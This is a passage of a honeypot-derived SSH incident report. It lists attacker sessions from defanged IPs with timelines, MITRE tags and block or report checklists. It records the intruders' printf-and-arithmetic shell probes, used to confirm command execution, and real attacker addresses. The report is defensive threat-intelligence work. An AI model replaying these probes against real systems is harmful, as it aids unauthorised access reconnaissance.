| `2026-11-10 06:00:32` | `cowrie.client.version` |
| `2026-11-10 06:00:32` | `cowrie.client.kex` |
| `2026-11-10 06:00:41` | `cowrie.login.success` |
| `2026-11-10 06:00:51` | `cowrie.client.size` |
| `2026-11-10 06:00:53` | `cowrie.session.params` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| `2026-11-10 06:00:55` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d0d2de84fe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:02 |
| **Last Seen** | 2026-11-10 06:03 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dd1e0cfc0b06fab4496462c89b13f9a3_small_control'"'"' '"'"'check_dd1e0cfc0b06fab4496462c89b13f9a3'"'"'', printf '\n%s|%s\n' 'check_dd1e0cfc0b06fab4496462c89b13f9a3_small_control' 'check_dd1e0cfc0b06fab4496462c89b13f9a3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dd1e0cfc0b06fab4496462c89b13f9a3_small_math'"'"' "$((775*352+56))"', (775*352+56, printf '\n%s|%s\n' 'check_dd1e0cfc0b06fab4496462c89b13f9a3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:02:29` | `cowrie.session.connect` |
| `2026-11-10 06:02:32` | `cowrie.client.version` |
| `2026-11-10 06:02:32` | `cowrie.client.kex` |
| `2026-11-10 06:02:52` | `cowrie.login.success` |
| `2026-11-10 06:03:03` | `cowrie.client.size` |
| `2026-11-10 06:03:06` | `cowrie.session.params` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| `2026-11-10 06:03:09` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2613e519d2da

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:07 |
| **Last Seen** | 2026-11-10 06:11 |
| **Session Duration** | 240s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5ec7d04e17f9bd231f05c088bd5d7c95_small_control'"'"' '"'"'check_5ec7d04e17f9bd231f05c088bd5d7c95'"'"'', printf '\n%s|%s\n' 'check_5ec7d04e17f9bd231f05c088bd5d7c95_small_control' 'check_5ec7d04e17f9bd231f05c088bd5d7c95', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5ec7d04e17f9bd231f05c088bd5d7c95_small_math'"'"' "$((336*804+14))"', (336*804+14, printf '\n%s|%s\n' 'check_5ec7d04e17f9bd231f05c088bd5d7c95_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:07:42` | `cowrie.session.connect` |
| `2026-11-10 06:07:44` | `cowrie.client.version` |
| `2026-11-10 06:07:44` | `cowrie.client.kex` |
| `2026-11-10 06:07:51` | `cowrie.login.success` |
| `2026-11-10 06:07:53` | `cowrie.client.size` |
| `2026-11-10 06:07:55` | `cowrie.session.params` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| `2026-11-10 06:07:58` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96105fd6ba0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:11 |
| **Last Seen** | 2026-11-10 06:14 |
| **Session Duration** | 176s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e6b3463a5f928282f609b0ff8590a8b8_small_control'"'"' '"'"'check_e6b3463a5f928282f609b0ff8590a8b8'"'"'', printf '\n%s|%s\n' 'check_e6b3463a5f928282f609b0ff8590a8b8_small_control' 'check_e6b3463a5f928282f609b0ff8590a8b8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e6b3463a5f928282f609b0ff8590a8b8_small_math'"'"' "$((237*141+84))"', (237*141+84, printf '\n%s|%s\n' 'check_e6b3463a5f928282f609b0ff8590a8b8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:11:43` | `cowrie.session.connect` |
| `2026-11-10 06:11:43` | `cowrie.client.version` |
| `2026-11-10 06:11:43` | `cowrie.client.kex` |
| `2026-11-10 06:11:43` | `cowrie.login.success` |
| `2026-11-10 06:11:44` | `cowrie.client.size` |
| `2026-11-10 06:11:44` | `cowrie.session.params` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| `2026-11-10 06:11:44` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef695bc9f70b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:14 |
| **Last Seen** | 2026-11-10 06:15 |
| **Session Duration** | 73s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e2e52087625366a2a53be2dfe8d194a3_small_control'"'"' '"'"'check_e2e52087625366a2a53be2dfe8d194a3'"'"'', printf '\n%s|%s\n' 'check_e2e52087625366a2a53be2dfe8d194a3_small_control' 'check_e2e52087625366a2a53be2dfe8d194a3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e2e52087625366a2a53be2dfe8d194a3_small_math'"'"' "$((260*400+80))"', (260*400+80, printf '\n%s|%s\n' 'check_e2e52087625366a2a53be2dfe8d194a3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:14:39` | `cowrie.session.connect` |
| `2026-11-10 06:14:42` | `cowrie.client.version` |
| `2026-11-10 06:14:42` | `cowrie.client.kex` |
| `2026-11-10 06:14:48` | `cowrie.login.success` |
| `2026-11-10 06:14:52` | `cowrie.client.size` |
| `2026-11-10 06:14:53` | `cowrie.session.params` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| `2026-11-10 06:14:55` | `cowrie.command.input` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-939bc78b5e32

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:16 |
| **Last Seen** | 2026-11-10 06:19 |
| **Session Duration** | 172s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5c7bd7ee8ed3726b122947aeb8a3964e_small_control'"'"' '"'"'check_5c7bd7ee8ed3726b122947aeb8a3964e'"'"'', printf '\n%s|%s\n' 'check_5c7bd7ee8ed3726b122947aeb8a3964e_small_control' 'check_5c7bd7ee8ed3726b122947aeb8a3964e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5c7bd7ee8ed3726b122947aeb8a3964e_small_math'"'"' "$((745*774+8))"', (745*774+8, printf '\n%s|%s\n' 'check_5c7bd7ee8ed3726b122947aeb8a3964e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:16:42` | `cowrie.session.connect` |
| `2026-11-10 06:16:42` | `cowrie.client.version` |
| `2026-11-10 06:16:43` | `cowrie.client.kex` |
| `2026-11-10 06:16:46` | `cowrie.login.success` |
| `2026-11-10 06:16:49` | `cowrie.client.size` |
| `2026-11-10 06:16:50` | `cowrie.session.params` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| `2026-11-10 06:16:51` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61aab73adffc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:19 |
| **Last Seen** | 2026-11-10 06:24 |
| **Session Duration** | 287s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_78909c8666e24ec520b6a4ac87993803_small_control'"'"' '"'"'check_78909c8666e24ec520b6a4ac87993803'"'"'', printf '\n%s|%s\n' 'check_78909c8666e24ec520b6a4ac87993803_small_control' 'check_78909c8666e24ec520b6a4ac87993803', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_78909c8666e24ec520b6a4ac87993803_small_math'"'"' "$((955*431+19))"', (955*431+19, printf '\n%s|%s\n' 'check_78909c8666e24ec520b6a4ac87993803_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:19:36` | `cowrie.session.connect` |
| `2026-11-10 06:19:36` | `cowrie.client.version` |
| `2026-11-10 06:19:38` | `cowrie.client.kex` |
| `2026-11-10 06:19:48` | `cowrie.login.success` |
| `2026-11-10 06:19:50` | `cowrie.client.size` |
| `2026-11-10 06:19:52` | `cowrie.session.params` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| `2026-11-10 06:19:54` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3678848cfa95

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:24 |
| **Last Seen** | 2026-11-10 06:29 |
| **Session Duration** | 291s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_91522705eb64db62ab43645e64c8b6dc_small_control'"'"' '"'"'check_91522705eb64db62ab43645e64c8b6dc'"'"'', printf '\n%s|%s\n' 'check_91522705eb64db62ab43645e64c8b6dc_small_control' 'check_91522705eb64db62ab43645e64c8b6dc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_91522705eb64db62ab43645e64c8b6dc_small_math'"'"' "$((314*80+52))"', (314*80+52, printf '\n%s|%s\n' 'check_91522705eb64db62ab43645e64c8b6dc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:24:23` | `cowrie.session.connect` |
| `2026-11-10 06:24:23` | `cowrie.client.version` |
| `2026-11-10 06:24:23` | `cowrie.client.kex` |
| `2026-11-10 06:24:24` | `cowrie.login.success` |
| `2026-11-10 06:24:26` | `cowrie.client.size` |
| `2026-11-10 06:24:27` | `cowrie.session.params` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| `2026-11-10 06:24:28` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b8c37f21b5c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:29 |
| **Last Seen** | 2026-11-10 06:33 |
| **Session Duration** | 234s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4517c9ff343ef1806b19d017dae10dad_small_control'"'"' '"'"'check_4517c9ff343ef1806b19d017dae10dad'"'"'', printf '\n%s|%s\n' 'check_4517c9ff343ef1806b19d017dae10dad_small_control' 'check_4517c9ff343ef1806b19d017dae10dad', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4517c9ff343ef1806b19d017dae10dad_small_math'"'"' "$((739*180+34))"', (739*180+34, printf '\n%s|%s\n' 'check_4517c9ff343ef1806b19d017dae10dad_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:29:15` | `cowrie.session.connect` |
| `2026-11-10 06:29:15` | `cowrie.client.version` |
| `2026-11-10 06:29:15` | `cowrie.client.kex` |
| `2026-11-10 06:29:17` | `cowrie.login.success` |
| `2026-11-10 06:29:18` | `cowrie.client.size` |
| `2026-11-10 06:29:19` | `cowrie.session.params` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| `2026-11-10 06:29:20` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a28a303831d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:33 |
| **Last Seen** | 2026-11-10 06:36 |
| **Session Duration** | 217s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3f1dde25948d8accfb9b1a61bf49dc09_small_control'"'"' '"'"'check_3f1dde25948d8accfb9b1a61bf49dc09'"'"'', printf '\n%s|%s\n' 'check_3f1dde25948d8accfb9b1a61bf49dc09_small_control' 'check_3f1dde25948d8accfb9b1a61bf49dc09', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3f1dde25948d8accfb9b1a61bf49dc09_small_math'"'"' "$((206*383+56))"', (206*383+56, printf '\n%s|%s\n' 'check_3f1dde25948d8accfb9b1a61bf49dc09_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:33:10` | `cowrie.session.connect` |
| `2026-11-10 06:33:11` | `cowrie.client.version` |
| `2026-11-10 06:33:11` | `cowrie.client.kex` |
| `2026-11-10 06:33:19` | `cowrie.login.success` |
| `2026-11-10 06:33:22` | `cowrie.client.size` |
| `2026-11-10 06:33:23` | `cowrie.session.params` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| `2026-11-10 06:33:25` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8ed1bf0cfa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:36 |
| **Last Seen** | 2026-11-10 06:37 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:36:48` | `cowrie.session.connect` |
| `2026-11-10 06:36:52` | `cowrie.client.version` |
| `2026-11-10 06:36:52` | `cowrie.client.kex` |
| `2026-11-10 06:37:01` | `cowrie.login.success` |
| `2026-11-10 06:37:06` | `cowrie.client.size` |
| `2026-11-10 06:37:08` | `cowrie.session.params` |
| `2026-11-10 06:37:16` | `cowrie.log.closed` |
| `2026-11-10 06:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fddd77aa11e7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:37 |
| **Last Seen** | 2026-11-10 06:37 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_15916df22b6a0d01fdd06bee56f6eeaf_small_control'"'"' '"'"'check_15916df22b6a0d01fdd06bee56f6eeaf'"'"'', printf '\n%s|%s\n' 'check_15916df22b6a0d01fdd06bee56f6eeaf_small_control' 'check_15916df22b6a0d01fdd06bee56f6eeaf', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_15916df22b6a0d01fdd06bee56f6eeaf_small_math'"'"' "$((537*399+90))"', (537*399+90, printf '\n%s|%s\n' 'check_15916df22b6a0d01fdd06bee56f6eeaf_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:37:34` | `cowrie.session.connect` |
| `2026-11-10 06:37:34` | `cowrie.client.version` |
| `2026-11-10 06:37:34` | `cowrie.client.kex` |
| `2026-11-10 06:37:39` | `cowrie.login.success` |
| `2026-11-10 06:37:47` | `cowrie.client.size` |
| `2026-11-10 06:37:50` | `cowrie.session.params` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| `2026-11-10 06:37:52` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a268d1d78f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:37 |
| **Last Seen** | 2026-11-10 06:41 |
| **Session Duration** | 233s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5f5bb70dfb0ba80ad4fd6723db42c211_small_control'"'"' '"'"'check_5f5bb70dfb0ba80ad4fd6723db42c211'"'"'', printf '\n%s|%s\n' 'check_5f5bb70dfb0ba80ad4fd6723db42c211_small_control' 'check_5f5bb70dfb0ba80ad4fd6723db42c211', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5f5bb70dfb0ba80ad4fd6723db42c211_small_math'"'"' "$((484*285+65))"', (484*285+65, printf '\n%s|%s\n' 'check_5f5bb70dfb0ba80ad4fd6723db42c211_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:37:59` | `cowrie.session.connect` |
| `2026-11-10 06:38:00` | `cowrie.client.version` |
| `2026-11-10 06:38:00` | `cowrie.client.kex` |
| `2026-11-10 06:38:03` | `cowrie.login.success` |
| `2026-11-10 06:38:05` | `cowrie.client.size` |
| `2026-11-10 06:38:08` | `cowrie.session.params` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| `2026-11-10 06:38:10` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38c49185631

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-11-10 06:41 |
| **Last Seen** | 2026-11-10 06:46 |
| **Session Duration** | 248s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_22fa0241d9f9dd3bcab52f5c18a9d199_small_control'"'"' '"'"'check_22fa0241d9f9dd3bcab52f5c18a9d199'"'"'', printf '\n%s|%s\n' 'check_22fa0241d9f9dd3bcab52f5c18a9d199_small_control' 'check_22fa0241d9f9dd3bcab52f5c18a9d199', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_22fa0241d9f9dd3bcab52f5c18a9d199_small_math'"'"' "$((979*578+31))"', (979*578+31, printf '\n%s|%s\n' 'check_22fa0241d9f9dd3bcab52f5c18a9d199_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 06:41:52` | `cowrie.session.connect` |
| `2026-11-10 06:41:52` | `cowrie.client.version` |
| `2026-11-10 06:41:53` | `cowrie.client.kex` |
| `2026-11-10 06:41:53` | `cowrie.login.success` |
| `2026-11-10 06:41:54` | `cowrie.client.size` |
| `2026-11-10 06:41:54` | `cowrie.session.params` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| `2026-11-10 06:41:54` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (112) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-81bd86d89fd9 | HIGH | `92.118.39[.]49` | 2026-11-10 06:46 | Y | 27 | 0 | `T1059.004 · T1078 · T1592` |
| IR-67098d8ed2bd | HIGH | `92.118.39[.]49` | 2026-11-10 06:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9eaa05845a1a | HIGH | `35.210.244[.]127` | 2026-11-10 06:52 | Y | 3 | 0 | `T1078` |
| IR-c526ed10a070 | HIGH | `35.210.244[.]127` | 2026-11-10 06:53 | Y | 1 | 0 | `T1078` |
| IR-6a2715e41ba6 | HIGH | `35.210.244[.]127` | 2026-11-10 06:53 | Y | 0 | 0 | `T1078` |
| IR-aea752f5f305 | HIGH | `176.53.159[.]196` | 2026-11-10 07:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f5b085284d19 | HIGH | `78.128.112[.]74` | 2026-11-10 07:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6cf0ef668e64 | HIGH | `35.210.223[.]3` | 2026-11-10 07:29 | Y | 3 | 0 | `T1078` |
